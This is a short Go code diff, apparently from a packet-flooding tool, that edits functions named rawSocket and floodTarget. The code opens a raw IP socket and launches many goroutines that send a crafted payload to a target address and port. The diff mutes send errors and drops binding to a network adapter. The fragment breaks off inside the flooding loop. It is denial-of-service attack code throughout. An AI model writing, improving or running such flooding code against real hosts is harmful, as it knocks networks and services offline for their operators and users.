@@ -10,23 +10,23 @@ import (
 func (tcp TCPIP) rawSocket(descriptor int, sockaddr syscall.SockaddrInet4) {
 	err := syscall.Sendto(descriptor, tcp.Payload, 0, &sockaddr)
 	if err != nil {
-		log.Println(err)
+		//log.Println(err)
 	}
 }
 
 func (tcp *TCPIP) floodTarget(rType reflect.Type, rVal reflect.Value, clients int, wg *sync.WaitGroup) {
 	var dest [4]byte
 	copy(dest[:], tcp.DST[:4])
-	fd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
-	err := syscall.BindToDevice(fd, tcp.Adapter)
+	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
 	if err != nil {
-		log.Println("bind to adapter %s failed: %v", tcp.Adapter, err)
+		log.Println(err)
 	}
 
 	addr := syscall.SockaddrInet4{
 		Port: int(tcp.DstPort),
 		Addr: dest,
 	}
+
 	for i := 0; i < clients; i++ {
 		wg.Add(1)
 		go func(rType reflect.Type, rVal reflect.Value, fd int,
